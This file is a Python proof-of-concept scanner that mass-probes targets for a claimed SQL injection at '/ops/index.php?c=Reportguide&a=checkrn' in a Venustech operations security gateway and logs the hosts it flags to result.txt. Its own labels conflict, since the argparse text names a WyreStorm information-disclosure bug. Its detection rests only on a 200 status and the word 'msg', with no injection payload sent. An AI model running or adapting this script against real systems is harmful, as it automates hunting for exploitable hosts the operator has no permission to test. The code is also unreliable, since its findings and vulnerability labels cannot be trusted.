# 启明星辰天玥运维安全网关SQL注入漏洞
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    pass

def main():  # 主函数
    banner()
    # 处理命令行输入的参数了吧
    # url file
    parser = argparse.ArgumentParser(description="WyreStorm Apollo VX20 信息泄露漏洞")  # 实例化
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')  # 添加函数
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')  # 添加函数

    args = parser.parse_args()  # 调用
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload = '/ops/index.php?c=Reportguide&a=checkrn'
    url = target+payload
    header = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"
    }
    data = {
        'checkname':'123',
        'tagid':'123'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    try:
        res1 = requests.post(url=url,headers=header,verify=False,data=data,proxies=proxies,timeout=10)
        if res1.status_code == 200 and "msg" in res1.text:
                print(f'[+] 该url存在漏洞地址为{target}')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
        else:
            print(f'[-]该url{target}不存在漏洞')
    except Exception as e:
        print(f'[*]该url{target}可能存在访问问题，请手工测试')



if __name__ == '__main__':  # 函数入口
    main()